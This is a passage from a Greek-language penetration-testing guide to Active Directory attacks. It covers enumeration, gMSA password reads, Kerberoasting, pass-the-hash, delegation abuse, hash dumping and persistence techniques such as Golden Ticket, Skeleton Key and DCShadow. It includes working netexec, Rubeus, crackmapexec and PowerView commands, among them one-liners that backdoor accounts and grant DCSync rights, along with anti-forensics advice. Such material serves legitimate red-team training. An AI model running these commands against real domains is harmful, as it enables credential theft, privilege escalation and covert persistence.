  - **Άλλα αυτοματοποιημένα εργαλεία AD enumeration είναι τα:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Έλεγξε τις [**εγγραφές DNS του AD**](ad-dns-records.md), καθώς μπορεί να περιέχουν ενδιαφέρουσες πληροφορίες.
- Ένα **εργαλείο με GUI** που μπορείς να χρησιμοποιήσεις για enumeration του directory είναι το **AdExplorer.exe** από το **SysInternal** Suite.
- Μπορείς επίσης να αναζητήσεις στη βάση δεδομένων LDAP με το **ldapsearch**, για να βρεις credentials στα πεδία _userPassword_ και _unixUserPassword_, ή ακόμη και στις σημειώσεις _description_ και _info_ των χρηστών. Ένα token στο _info_ που δεν έχει ετικέτα και μοιάζει με κωδικό πρόσβασης είναι μόνο υποψήφιο στοιχείο: επιβεβαίωσε ξεχωριστά τον σκοπό και την εγκυρότητά του και μην συμπεριλαμβάνεις το περιεχόμενο των σημειώσεων σε συνηθισμένο output enumeration. Δες το [Password in AD User comment στο PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) για άλλες μεθόδους.
- Έλεγξε τα **προσβάσιμα** domain logon και drive-mapping scripts στο `\\<dc>\NETLOGON` ή στο `\\<dc>\SYSVOL\<domain>\scripts`, εφόσον το επιτρέπει η εξουσιοδότηση. Η Microsoft τεκμηριώνει [τον ρόλο του share NETLOGON ως καταλόγου scripts](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller). Κατάγραψε πρώτα τα ονόματα και έπειτα εξέτασε μόνο τα σχετικά, αναγνώσιμα scripts εντός ορίου μεγέθους. Μην κάνεις dump ολόκληρο το share και μην εμφανίζεις τιμές credentials κατά το συνηθισμένο enumeration. Μια κλήση PowerShell στο [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **δεν προστατεύει** έναν κυριολεκτικό κωδικό πρόσβασης που είναι αποθηκευμένος στο script. Η κλήση από μόνη της δεν αποδεικνύει ότι υπάρχει hardcoded μυστικό: εντόπισε την πραγματική είσοδό της και, στη συνέχεια, επαλήθευσε ξεχωριστά τον λογαριασμό, την εγκυρότητα των credentials και τα προνόμια. Η εξέταση ενός domain script αφορά ένα remote share και είναι ξεχωριστή από το local host enumeration.
- Αν χρησιμοποιείς **Linux**, μπορείς επίσης να κάνεις enumeration του domain με το [**pywerview**](https://github.com/the-useless-one/pywerview).
- Μπορείς επίσης να δοκιμάσεις αυτοματοποιημένα εργαλεία όπως:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Εξαγωγή όλων των χρηστών του domain**

  Είναι πολύ εύκολο να λάβεις όλα τα usernames του domain από Windows (`net user /domain` ,`Get-DomainUser` ή `wmic useraccount get name,sid`). Στο Linux, μπορείς να χρησιμοποιήσεις: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ή `enum4linux -a -u "user" -p "password" <DC IP>`

> Παρότι αυτή η ενότητα για το Enumeration φαίνεται μικρή, είναι το σημαντικότερο μέρος όλων. Άνοιξε τους συνδέσμους (κυρίως αυτούς για cmd, powershell, powerview και BloodHound), μάθε πώς να κάνεις enumeration ενός domain και εξασκήσου μέχρι να νιώθεις άνετα. Κατά τη διάρκεια μιας αξιολόγησης, αυτή θα είναι η καθοριστική στιγμή για να βρεις τον δρόμο σου προς το DA ή να αποφασίσεις ότι δεν μπορεί να γίνει τίποτα.

### Προβλέψιμοι προδημιουργημένοι λογαριασμοί υπολογιστών -> πρόσβαση σε κωδικούς πρόσβασης gMSA

Οι λογαριασμοί υπολογιστών που έχουν προετοιμαστεί για legacy joins ενδέχεται να διατηρούν έναν προβλέψιμο αρχικό κωδικό πρόσβασης. Το module `pre2k` του NetExec εντοπίζει τη χαρακτηριστική τιμή `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) και επιχειρεί να λάβει Kerberos TGT χρησιμοποιώντας τους πρώτους 14 χαρακτήρες του ονόματος του υπολογιστή σε πεζά, χωρίς το τελικό `$`. Θεώρησε αυτή την τιμή UAC ως κριτήριο επιλογής υποψηφίων, αντί να υποθέσεις ότι η συμμετοχή στο **Pre-Windows 2000 Compatible Access** από μόνη της αποδεικνύει ότι ο κωδικός πρόσβασης είναι αδύναμος.<sup>[[18]](#references)[[20]](#references)</sup>

Χρησιμοποίησε authenticated LDAP enumeration για να ελέγξεις τους υποψηφίους και να αποθηκεύσεις τα TGT που αποκτήθηκαν επιτυχώς. Το `ALL=True` επεκτείνει τους ελέγχους πέρα από τα αντικείμενα που πληρούν το προεπιλεγμένο φίλτρο `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Μια αποτυχημένη σύνδεση bind με τις προεπιλεγμένες ρυθμίσεις/NTLM **δεν** ακυρώνει αυτό το εύρημα: δοκιμάστε με `-k`, με ένα FQDN που επιλύεται στη διεύθυνση του DC και με ρολόι συγχρονισμένο με το KDC. Οι επιτυχημένες εκτελέσεις του module αποθηκεύουν λίστες υποψηφίων και ccaches που έχουν αποκτηθεί κάτω από το `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Αφού παραβιάσετε το computer principal, χαρτογραφήστε τις ένθετες συμμετοχές του σε ομάδες και τα εξερχόμενα δικαιώματά του. Ειδικότερα, principals που αναφέρονται στο security descriptor `msDS-GroupMSAMembership` ενός gMSA μπορούν να διαβάσουν το `msDS-ManagedPassword`. Η έξοδος του NetExec με `--gmsa` εμφανίζει τους επιτρεπόμενους principals και επιστρέφει το τρέχον NT hash, εφόσον ο υπολογιστής που χρησιμοποιείται για την αυθεντικοποίηση είναι εξουσιοδοτημένος.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Στη συνέχεια αξιολόγησε το ανακτημένο gMSA όπως κάθε άλλο credential: έλεγξε τη συμμετοχή σε τοπικές/τομεακές ομάδες, τα δικαιώματα logon, τα SPN, την delegation και τις προσβάσιμες υπηρεσίες πριν δοκιμάσεις pass-the-hash. Αυτή η διαδρομή ανάκτησης μέσω ACL διαφέρει από το [Golden gMSA/dMSA](golden-dmsa-gmsa.md), το οποίο παράγει managed passwords μετά από παραβίαση του KDS root key.<sup>[[20]](#references)</sup>

Ένα computer principal μπορεί επίσης να έχει εξερχόμενο έλεγχο σε άλλα computer objects ή ομάδες. Αφού αποκτήσεις ένα, έλεγξε ξεχωριστά τις ένθετες συμμετοχές του και τα αποτελεσματικά ACL: ένα δικαίωμα εγγραφής σε άλλο computer object μπορεί να επιτρέψει αλλαγή λογαριασμού, ενώ τα δικαιώματα συμμετοχής σε ομάδα μπορεί να οδηγήσουν σε ρόλο logon. Μια σημαία staged-account, μια προβλέψιμη σύμβαση ονοματοδοσίας ή μια ακμή `GenericWrite` από μόνη της δεν αποδεικνύει την πλήρη διαδρομή.

Ένα αναγνώσιμο αντίγραφο ενός blob `msDS-ManagedPassword` σε αρχείο, share ή backup αποτελεί ξεχωριστή διαδρομή έκθεσης: το LDAP read ACL δεν μπορεί να προστατεύσει ένα αντίγραφο αποθηκευμένο αλλού. Επιβεβαίωσε ότι τα δεδομένα είναι blob managed password πριν τα ερμηνεύσεις και ξεχώρισε αυτή την περίπτωση τόσο από μια εξουσιοδοτημένη ανάγνωση LDAP όσο και από την παραγωγή μέσω KDS root key.

### Kerberoast

Το Kerberoasting περιλαμβάνει την απόκτηση **TGS tickets** που χρησιμοποιούνται από υπηρεσίες συνδεδεμένες με user accounts και το offline cracking της κρυπτογράφησής τους —η οποία βασίζεται στους κωδικούς πρόσβασης των χρηστών—.

Περισσότερα σχετικά με αυτό στο:


{{#ref}}
kerberoast.md
{{#endref}}

### Απομακρυσμένη σύνδεση (RDP, SSH, FTP, Win-RM κ.λπ.)

Αφού αποκτήσεις κάποια credentials, μπορείς να ελέγξεις αν έχεις πρόσβαση σε κάποιο **machine**. Για τον σκοπό αυτό, μπορείς να χρησιμοποιήσεις το **CrackMapExec** για να δοκιμάσεις σύνδεση σε πολλούς servers με διαφορετικά πρωτόκολλα, σύμφωνα με τα port scans σου.

### Local Privilege Escalation

Αν έχεις παραβιάσει credentials ή έχεις session ως κανονικός χρήστης του domain και μπορείς να αποκτήσεις πρόσβαση σε **οποιοδήποτε machine στο domain**, αναζήτησε τρόπο να **κλιμακώσεις τοπικά τα προνόμιά σου και να συλλέξεις credentials**. Τα τοπικά δικαιώματα administrator μπορεί να σου επιτρέψουν να **κάνεις dump τα hashes άλλων χρηστών** από τη μνήμη (LSASS) και τον τοπικό χώρο αποθήκευσης (SAM).

Σε αυτό το βιβλίο υπάρχει μια ολοκληρωμένη σελίδα για το [**local privilege escalation στα Windows**](../windows-local-privilege-escalation/index.html) και ένα [**checklist**](../checklist-windows-privilege-escalation.md). Επίσης, μην ξεχάσεις να χρησιμοποιήσεις το [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets τρέχουσας συνεδρίας

Είναι πολύ **απίθανο** να βρεις **tickets** στον τρέχοντα χρήστη που να **σου δίνουν δικαίωμα πρόσβασης** σε μη αναμενόμενους πόρους, αλλά μπορείς να ελέγξεις:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Με διαπιστευτήρια domain ή μια συνεδρία χρήστη, επανεξέτασε τις [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): οι τεχνικές authenticated enumeration και coercion μπορούν να αποκαλύψουν διαδρομές relay που δεν ήταν διαθέσιμες κατά την αναγνώριση χωρίς authentication.

### Αναζήτηση διαπιστευτηρίων σε κοινόχρηστους φακέλους υπολογιστών | SMB Shares

Τώρα που έχεις μερικά βασικά διαπιστευτήρια, πρέπει να ελέγξεις αν μπορείς να **εντοπίσεις** ενδιαφέροντα **αρχεία που είναι κοινόχρηστα μέσα στο AD**. Μπορείς να το κάνεις χειροκίνητα, αλλά είναι πολύ βαρετή και επαναλαμβανόμενη εργασία (ακόμα περισσότερο αν βρεις εκατοντάδες έγγραφα που πρέπει να ελέγξεις).

[**Ακολούθησε αυτόν τον σύνδεσμο για να μάθεις ποια εργαλεία μπορείς να χρησιμοποιήσεις.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Κλοπή NTLM διαπιστευτηρίων

Αν μπορείς να **αποκτήσεις πρόσβαση σε άλλους υπολογιστές ή κοινόχρηστους φακέλους**, μπορείς να **τοποθετήσεις αρχεία** (όπως ένα αρχείο SCF) τα οποία, αν προσπελαστούν με κάποιον τρόπο, θα **ενεργοποιήσουν NTLM authentication εναντίον σου**, ώστε να μπορέσεις να **υποκλέψεις** το **NTLM challenge** και να το κάνεις crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Αυτή η ευπάθεια επέτρεπε σε οποιονδήποτε authenticated χρήστη να **παραβιάσει τον domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Κλιμάκωση προνομίων στο Active Directory ΜΕ προνομιούχα διαπιστευτήρια/συνεδρία

**Για τις παρακάτω τεχνικές δεν αρκεί ένας απλός χρήστης domain· χρειάζεσαι ειδικά προνόμια/διαπιστευτήρια για να εκτελέσεις αυτές τις επιθέσεις.**

### Εξαγωγή hash

Ας ελπίσουμε ότι κατάφερες να **παραβιάσεις κάποιον λογαριασμό local admin** χρησιμοποιώντας [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), συμπεριλαμβανομένου του relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [κλιμάκωση προνομίων τοπικά](../windows-local-privilege-escalation/index.html).\
Έπειτα, ήρθε η ώρα να κάνεις dump όλα τα hash από τη μνήμη και τοπικά.\
[**Διάβασε αυτήν τη σελίδα για τους διαφορετικούς τρόπους απόκτησης των hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Μόλις αποκτήσεις το hash ενός χρήστη**, μπορείς να το χρησιμοποιήσεις για να **τον υποδυθείς**.\
Πρέπει να χρησιμοποιήσεις κάποιο **εργαλείο** που θα **εκτελέσει** το **NTLM authentication χρησιμοποιώντας** αυτό το **hash**, **ή** μπορείς να δημιουργήσεις ένα νέο **sessionlogon** και να **εισάγεις** αυτό το **hash** μέσα στο **LSASS**, ώστε να χρησιμοποιείται αυτό το **hash** κάθε φορά που εκτελείται **NTLM authentication**. Αυτό κάνει η mimikatz στην τελευταία περίπτωση.\
[**Διάβασε αυτήν τη σελίδα για περισσότερες πληροφορίες.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Αυτή η επίθεση στοχεύει στη **χρήση του NTLM hash του χρήστη για την αίτηση Kerberos tickets**, ως εναλλακτική στη συνηθισμένη χρήση του Pass The Hash μέσω του πρωτοκόλλου NTLM. Επομένως, μπορεί να είναι ιδιαίτερα **χρήσιμη σε δίκτυα όπου το πρωτόκολλο NTLM είναι απενεργοποιημένο** και επιτρέπεται ως πρωτόκολλο authentication μόνο το **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Στη μέθοδο επίθεσης **Pass The Ticket (PTT)**, οι επιτιθέμενοι **υποκλέπτουν το authentication ticket ενός χρήστη** αντί για τον κωδικό πρόσβασής του ή τις τιμές hash. Στη συνέχεια, χρησιμοποιούν αυτό το κλεμμένο ticket για να **υποδυθούν τον χρήστη**, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε πόρους και υπηρεσίες μέσα σε ένα δίκτυο.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Επαναχρησιμοποίηση διαπιστευτηρίων

Αν έχεις το **hash** ή τον **κωδικό πρόσβασης** ενός **local administrator**, πρέπει να δοκιμάσεις να **συνδεθείς τοπικά** σε άλλους **υπολογιστές** χρησιμοποιώντας τα.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Σημειώστε ότι αυτό είναι αρκετά **noisy** και το **LAPS** θα το **μετρίαζε**.

### Κατάχρηση MSSQL & Trusted Links

Αν ένας χρήστης έχει δικαιώματα **πρόσβασης σε instances MSSQL**, μπορεί να είναι σε θέση να **εκτελέσει εντολές** στον host MSSQL (αν εκτελείται ως SA), να **κλέψει** το **hash** NetNTLM ή ακόμη και να πραγματοποιήσει **relay attack**.\
Αν ένα instance MSSQL είναι έμπιστο μέσω database link από άλλο instance, ένας χρήστης με δικαιώματα στη συνδεδεμένη βάση δεδομένων μπορεί να είναι σε θέση να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει queries στο άλλο instance**. Αυτές οι σχέσεις εμπιστοσύνης μπορούν να αλυσιδωθούν και ενδέχεται τελικά να οδηγήσουν σε μια εσφαλμένα ρυθμισμένη βάση δεδομένων, όπου ο χρήστης μπορεί να εκτελέσει εντολές.\
**Οι σύνδεσμοι μεταξύ βάσεων δεδομένων λειτουργούν ακόμη και μέσω forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Κατάχρηση πλατφορμών IT asset/deployment

Οι σουίτες απογραφής και ανάπτυξης τρίτων συχνά παρέχουν ισχυρές δυνατότητες πρόσβασης σε credentials και εκτέλεσης κώδικα. Δείτε:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Αν εντοπίσετε οποιοδήποτε αντικείμενο Computer με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχετε δικαιώματα domain στον υπολογιστή, θα μπορείτε να κάνετε dump τα TGTs από τη μνήμη όλων των χρηστών που συνδέονται στον υπολογιστή.\
Άρα, αν ένας **Domain Admin συνδεθεί στον υπολογιστή**, θα μπορείτε να κάνετε dump το TGT του και να τον υποδυθείτε χρησιμοποιώντας [Pass the Ticket](pass-the-ticket.md).\
Χάρη στο constrained delegation, θα μπορούσατε ακόμη και να **παραβιάσετε αυτόματα έναν Print Server** (ελπίζουμε να είναι DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Αν σε έναν χρήστη ή υπολογιστή επιτρέπεται το "Constrained Delegation", θα μπορεί να **υποδυθεί οποιονδήποτε χρήστη για να αποκτήσει πρόσβαση σε ορισμένες υπηρεσίες ενός υπολογιστή**.\
Έπειτα, αν **παραβιάσετε το hash** αυτού του χρήστη/υπολογιστή, θα μπορείτε να **υποδυθείτε οποιονδήποτε χρήστη** (ακόμη και domain admins) για να αποκτήσετε πρόσβαση σε ορισμένες υπηρεσίες.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resource-based Constrained Delegation

Η κατοχή δικαιώματος **WRITE** σε ένα αντικείμενο Active Directory ενός απομακρυσμένου υπολογιστή επιτρέπει την απόκτηση δυνατότητας εκτέλεσης κώδικα με **αυξημένα δικαιώματα**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Κατάχρηση Permissions/ACLs

Ο παραβιασμένος χρήστης μπορεί να έχει ορισμένα **ενδιαφέροντα δικαιώματα σε αντικείμενα του domain**, τα οποία θα μπορούσαν να σας επιτρέψουν να κινηθείτε πλευρικά/**κλιμακώσετε** τα δικαιώματά σας.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Κατάχρηση της υπηρεσίας Printer Spooler

Ο εντοπισμός μιας υπηρεσίας **Spool που ακούει** εντός του domain μπορεί να **αξιοποιηθεί** για την **απόκτηση νέων credentials** και την **κλιμάκωση δικαιωμάτων**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Κατάχρηση sessions τρίτων

Αν **άλλοι χρήστες** **αποκτούν πρόσβαση** στο **παραβιασμένο** μηχάνημα, είναι δυνατό να **συλλεχθούν credentials από τη μνήμη** και ακόμη και να **εισαχθούν beacons στις διεργασίες τους** για να τους υποδυθείτε.\
Συνήθως, οι χρήστες αποκτούν πρόσβαση στο σύστημα μέσω RDP, επομένως εδώ θα βρείτε πώς να εκτελέσετε μερικές επιθέσεις σε RDP sessions τρίτων:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει ένα σύστημα διαχείρισης του **κωδικού πρόσβασης του τοπικού Administrator** σε υπολογιστές συνδεδεμένους σε domain, διασφαλίζοντας ότι είναι **τυχαίος**, μοναδικός και **αλλάζει** συχνά. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs, ώστε να επιτρέπεται μόνο σε εξουσιοδοτημένους χρήστες. Με επαρκή δικαιώματα πρόσβασης σε αυτούς τους κωδικούς πρόσβασης, είναι δυνατή η μετάβαση σε άλλους υπολογιστές.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Για εγγραφή στο AD CS, αντιστοίχιση certificate και απαρίθμηση πριν από την επιδίωξη κλοπής certificate ή κατάχρησης template, δείτε την [επισκόπηση των AD Certificates](ad-certificates.md).

Η **συλλογή certificates** από το παραβιασμένο μηχάνημα θα μπορούσε να αποτελέσει τρόπο κλιμάκωσης δικαιωμάτων στο περιβάλλον:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Κατάχρηση Certificate Templates

Αν έχουν ρυθμιστεί **ευάλωτα templates**, είναι δυνατό να αξιοποιηθούν για την κλιμάκωση δικαιωμάτων:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation με λογαριασμό υψηλών δικαιωμάτων

### Dumping Domain Credentials

Μόλις αποκτήσετε δικαιώματα **Domain Admin** ή, ακόμη καλύτερα, **Enterprise Admin**, μπορείτε να κάνετε **dump** τη **βάση δεδομένων του domain**: _ntds.dit_.

[**Περισσότερες πληροφορίες για την επίθεση DCSync μπορείτε να βρείτε εδώ**](dcsync.md).

[**Περισσότερες πληροφορίες για την κλοπή του NTDS.dit μπορείτε να βρείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Ένα αναγνώσιμο εφεδρικό αρχείο που περιέχει το `ntds.dit` μαζί με την κυψέλη `SYSTEM` θα πρέπει να θεωρείται εκτεθειμένο υλικό του καταλόγου ακόμη και πριν από την εξαγωγή του περιεχομένου του. Ένα παλιό password hash δεν καθιστά ασφαλή τα υπόλοιπα attributes των αντικειμένων: πεδία όπως το `description` μπορεί να περιέχουν credentials ή λειτουργικές σημειώσεις. Ελέγξτε πρώτα τα ονόματα των μελών του αρχείου και μην συμπεριλαμβάνετε τα περιεχόμενα της εξαγόμενης βάσης δεδομένων στη συνήθη έξοδο απαρίθμησης.

### Privesc as Persistence

Ορισμένες από τις τεχνικές που συζητήθηκαν προηγουμένως μπορούν να χρησιμοποιηθούν για persistence.\
Για παράδειγμα, θα μπορούσατε να:

- Κάνετε τους χρήστες ευάλωτους σε [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Κάντε τους χρήστες ευάλωτους σε [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Παραχωρήστε σε έναν χρήστη δικαιώματα [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

Η **επίθεση Silver Ticket** δημιουργεί ένα **έγκυρο εισιτήριο Ticket Granting Service (TGS)** για μια συγκεκριμένη υπηρεσία, χρησιμοποιώντας το **NTLM hash** (για παράδειγμα, το **hash του λογαριασμού του PC**). Αυτή η μέθοδος χρησιμοποιείται για **πρόσβαση στα δικαιώματα της υπηρεσίας**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Μια **επίθεση Golden Ticket** περιλαμβάνει την απόκτηση από τον επιτιθέμενο του **NTLM hash του λογαριασμού krbtgt** σε περιβάλλον Active Directory (AD). Αυτός ο λογαριασμός είναι ειδικός, επειδή χρησιμοποιείται για την υπογραφή όλων των **Ticket Granting Tickets (TGTs)**, τα οποία είναι απαραίτητα για την ταυτοποίηση στο δίκτυο AD.

Μόλις αποκτήσει αυτό το hash, ο επιτιθέμενος μπορεί να δημιουργήσει **TGTs** για οποιονδήποτε λογαριασμό επιλέξει (επίθεση Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Πρόκειται για golden tickets που έχουν παραποιηθεί με τρόπο που **παρακάμπτει τους συνήθεις μηχανισμούς ανίχνευσης golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence μέσω πιστοποιητικών λογαριασμού**

**Η κατοχή πιστοποιητικών ενός λογαριασμού ή η δυνατότητα αίτησής τους** είναι ένας πολύ καλός τρόπος για να διατηρήσετε persistence στον λογαριασμό ενός χρήστη (ακόμα κι αν αλλάξει τον κωδικό πρόσβασής του):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence μέσω πιστοποιητικών domain**

**Η χρήση πιστοποιητικών επιτρέπει επίσης τη διατήρηση persistence με υψηλά δικαιώματα μέσα στο domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Ομάδα AdminSDHolder

Το αντικείμενο **AdminSDHolder** στο Active Directory διασφαλίζει την ασφάλεια των **προνομιούχων ομάδων** (όπως οι Domain Admins και Enterprise Admins), εφαρμόζοντας μια τυπική **Access Control List (ACL)** σε αυτές τις ομάδες, ώστε να αποτρέψει μη εξουσιοδοτημένες αλλαγές. Ωστόσο, αυτή η λειτουργία μπορεί να αποτελέσει αντικείμενο εκμετάλλευσης: αν ένας επιτιθέμενος τροποποιήσει την ACL του AdminSDHolder ώστε να δώσει πλήρη πρόσβαση σε έναν απλό χρήστη, αυτός ο χρήστης αποκτά εκτεταμένο έλεγχο σε όλες τις προνομιούχες ομάδες. Έτσι, αυτό το μέτρο ασφαλείας, που προορίζεται για προστασία, μπορεί να έχει το αντίθετο αποτέλεσμα, επιτρέποντας μη εξουσιοδοτημένη πρόσβαση, αν δεν παρακολουθείται στενά.

[**Περισσότερες πληροφορίες για την ομάδα AdminDSHolder εδώ.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Διαπιστευτήρια DSRM

Σε κάθε **Domain Controller (DC)** υπάρχει ένας **τοπικός λογαριασμός διαχειριστή**. Αποκτώντας δικαιώματα διαχειριστή σε ένα τέτοιο μηχάνημα, μπορείτε να εξαγάγετε το hash του τοπικού Administrator χρησιμοποιώντας το **mimikatz**. Στη συνέχεια, απαιτείται τροποποίηση του registry για να **ενεργοποιηθεί η χρήση αυτού του κωδικού πρόσβασης**, επιτρέποντας την απομακρυσμένη πρόσβαση στον τοπικό λογαριασμό Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistence μέσω ACL

Μπορείτε να **δώσετε** σε έναν **χρήστη** ορισμένα **ειδικά δικαιώματα** σε συγκεκριμένα αντικείμενα του domain, τα οποία θα του επιτρέψουν να **κλιμακώσει τα δικαιώματά του στο μέλλον**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Περιγραφείς ασφαλείας

Οι **περιγραφείς ασφαλείας** χρησιμοποιούνται για την **αποθήκευση** των **δικαιωμάτων** που έχει ένα **αντικείμενο** **πάνω σε** ένα **αντικείμενο**. Αν μπορέσετε να κάνετε μια **μικρή αλλαγή** στον **περιγραφέα ασφαλείας** ενός αντικειμένου, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα δικαιώματα πάνω σε αυτό το αντικείμενο, χωρίς να χρειάζεται να είστε μέλος προνομιούχας ομάδας.


{{#ref}}
security-descriptors.md
{{#endref}}

### Αντι-εγκληματολογικές τεχνικές / Evasion με Dynamic Objects

Εκμεταλλευτείτε την auxiliary class `dynamicObject` για να δημιουργήσετε βραχύβιες οντότητες principals/GPOs/DNS records με `entryTTL`/`msDS-Entry-Time-To-Die`. Αυτές διαγράφονται αυτόματα χωρίς tombstones, εξαλείφοντας τα στοιχεία στο LDAP, αλλά αφήνοντας orphan SIDs, κατεστραμμένες αναφορές `gPLink` ή αποθηκευμένες στην cache απαντήσεις DNS (π.χ. ρύπανση ACE του AdminSDHolder ή κακόβουλες ανακατευθύνσεις `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Τροποποιήστε το **LSASS** στη μνήμη για να ορίσετε έναν **καθολικό κωδικό πρόσβασης**, παρέχοντας πρόσβαση σε όλους τους λογαριασμούς του domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Μάθετε εδώ τι είναι ένα SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **καταγράφετε** σε **απλό κείμενο** τα **διαπιστευτήρια** που χρησιμοποιούνται για την πρόσβαση στο μηχάνημα.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Καταχωρίζει έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **προωθήσει attributes** (SIDHistory, SPNs...) σε καθορισμένα αντικείμενα, **χωρίς** να αφήσει **logs** σχετικά με τις **τροποποιήσεις**. Χρειάζεστε δικαιώματα **DA** και πρέπει να βρίσκεστε μέσα στο **root domain**.\
Σημειώστε ότι αν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistence μέσω LAPS

Προηγουμένως συζητήσαμε πώς να κλιμακώσετε δικαιώματα αν έχετε **επαρκή δικαιώματα για να διαβάσετε κωδικούς πρόσβασης LAPS**. Ωστόσο, αυτοί οι κωδικοί πρόσβασης μπορούν επίσης να χρησιμοποιηθούν για τη **διατήρηση persistence**.\
Δείτε:


{{#ref}}
laps.md
{{#endref}}

## Κλιμάκωση δικαιωμάτων στο Forest - Trusts domain

